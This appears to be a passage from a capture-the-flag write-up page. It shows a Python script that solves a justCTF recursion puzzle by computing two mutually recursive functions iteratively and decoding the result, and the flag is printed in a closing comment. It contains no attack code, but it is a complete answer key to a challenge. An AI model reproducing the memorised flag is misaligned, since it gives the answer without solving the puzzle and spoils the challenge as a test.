                A = 12871709638832864416674237492708808074465131233250468097567609804146306910998417223517320307084142930385333755674444057095681119233485961920941215894136808839080569675919567597231
                B = 805129649450289111374098215345043938348341847793365469885914570440914675704049341968773123354333661444680237475120349087680072042981825910641377252873686258216120616639500404381


                def F(x):
                    if x == 0:
                        return 2
                    elif x <= 1:
                        return 1
                    else:
                        result = x - 4 + (73 * x ** 5) + (8 * x ** 3) + G(x - 1)
                        return result


                def G(x):
                    if x <= 1:
                        return 1
                    else:
                        result = F(x - 1) + 3 * F(x - 2) - 5 * F(x - 3) + (3 * x ** 4)
                        return result


                fs = [F(0), F(1), F(2)]
                gs = [G(0), G(1), G(2)]

                for x in range(3, 13338):
                    gs.append(fs[x - 1] + 3 * fs[x - 2] - 5 * fs[x - 3] + (3 * x ** 4))
                    fs.append(x - 4 + (73 * x ** 5) + (8 * x ** 3) + gs[x - 1])

                print(F(9), fs[9])  # 6759072 6759072

                flag = fs[13337] % A + B
                print(long_to_bytes(flag).decode())

                # justCTF{1n_0rd3r_70_und3r574nd_r3cur510n_y0u_h4v3_t0_und3r574nd_r3cur510n}
                `}
            />
        </>
    );
}
